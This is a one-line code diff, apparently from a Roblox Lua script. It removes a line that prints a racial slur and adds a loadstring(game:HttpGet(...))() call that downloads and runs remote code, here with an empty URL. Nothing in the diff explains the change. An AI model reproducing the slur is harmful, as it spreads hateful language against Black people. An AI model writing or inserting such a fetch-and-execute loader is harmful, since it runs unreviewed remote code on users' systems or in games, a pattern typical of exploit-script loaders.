@@ -1,1 +1,1 @@
-print("Test niggers")
+loadstring(game:HttpGet("", true))()
